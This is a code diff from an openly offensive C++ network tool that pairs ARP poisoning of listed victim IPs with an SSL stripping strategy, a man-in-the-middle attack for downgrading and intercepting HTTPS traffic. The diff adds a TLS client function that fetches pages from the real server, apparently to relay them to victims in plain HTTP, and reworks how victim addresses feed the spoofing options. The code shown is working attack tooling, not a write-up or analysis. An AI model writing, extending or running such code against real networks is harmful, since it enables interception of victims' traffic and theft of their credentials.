@@ -1,4 +1,3 @@
-#include "ssl_stripping/silent.h"
 #include "HttpLayer.h"
 #include "IPv4Layer.h"
 #include "IpAddress.h"
@@ -10,9 +9,11 @@
 #include "arp_poisoning/public.h"
 #include "log.h"
 #include "ssl_stripping/public.h"
+#include "ssl_stripping/silent.h"
 #include <algorithm>
 #include <boost/asio.hpp>
-#include <boost/system/error_code.hpp> // Required for boost::system::error_code
+#include <boost/asio/ssl.hpp>
+#include <boost/system/error_code.hpp>
 #include <exception>
 #include <future>
 #include <stdexcept>
@@ -20,16 +21,6 @@
 #include <unordered_set>
 #include <vector>
 
-#ifdef _WIN32
-#include <winsock2.h>
-#include <ws2tcpip.h> // for getaddrinfo, inet_ntop
-#pragma comment(lib, "ws2_32.lib")
-#else
-#include <arpa/inet.h>
-#include <cstring>
-#include <netdb.h>
-#include <unistd.h>
-#endif
 
 std::optional<std::unordered_set<std::string>>
 resolveDomainToIP(const std::string &domain, const std::string &service) {
@@ -67,6 +58,61 @@ resolveDomainToIP(const std::string &domain, const std::string &service) {
                   ". Error message: " + e.what());
     }
     return outputIps;
+}
+
+void connectWithServer(const std::string &domain) {
+    try {
+        const std::string HTTPS_PORT = "443";
+
+        // Setup the asio and SSL context
+        boost::asio::io_context ioc;
+        boost::asio::ssl::context ssl_ctx(
+            boost::asio::ssl::context::tlsv13_client);
+
+        // Tell asio to use the default system certificate store
+        ssl_ctx.set_default_verify_paths();
+
+        // Create the SSL stream, wrapping a TCP socket
+        boost::asio::ssl::stream<boost::asio::ip::tcp::socket> stream(ioc,
+                                                                      ssl_ctx);
+
+        // Tell the server which website you want to talk to.
+        SSL_set_tlsext_host_name(stream.native_handle(), domain.c_str());
+
+        // Resolve the hostname to an IP address
+        boost::asio::ip::tcp::resolver resolver(ioc);
+        auto endpoints = resolver.resolve(domain, HTTPS_PORT);
+
+        // Connect the underlying TCP socket
+        boost::asio::connect(stream.lowest_layer(), endpoints);
+
+        // Perform the TLS Handshake
+        stream.handshake(boost::asio::ssl::stream_base::client);
+
+        LOG_INFO("Handshake successful!");
+
+        // Send an HTTP GET request over the secure stream
+        std::string request = "GET / HTTP/1.1\r\nHost: " + domain +
+                              "\r\nConnection: close\r\n\r\n";
+        boost::asio::write(stream, boost::asio::buffer(request));
+
+        // Read the response
+        boost::asio::streambuf response;
+        boost::system::error_code exc;
+        boost::asio::read(stream, response, exc);
+
+        // Check for a clean close
+        if (exc == boost::asio::error::eof) {
+            LOG_INFO("Cleanly received response:");
+            // Print the response headers and body
+            LOG_INFO(&response);
+        } else if (exc) {
+            throw boost::system::system_error(exc);
+        }
+
+    } catch (std::exception &e) {
+        std::cerr << "Exception: " << e.what() << std::endl;
+    }
 }
 
 void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
@@ -126,8 +172,10 @@ void ATK::SSL::SilentSslStrippingStrategy::execute() {
         // Initialize options with values based on this call
         ATK::ARP::SilentPoisoningOptions options;
         options.ifaceIpOrName = device_->getName();
-        std::unordered_set<std::string> victimIpsSet(victimIps_.begin(),
-                                                     victimIps_.end());
+        std::unordered_set<std::string> victimIpsSet;
+        for (const auto& victimIp : victimIps_) {
+            victimIpsSet.insert(victimIp.toString());
+        };
         options.victimIps = victimIpsSet;
         std::unordered_set<std::string> ipsToSpoofSet;
 
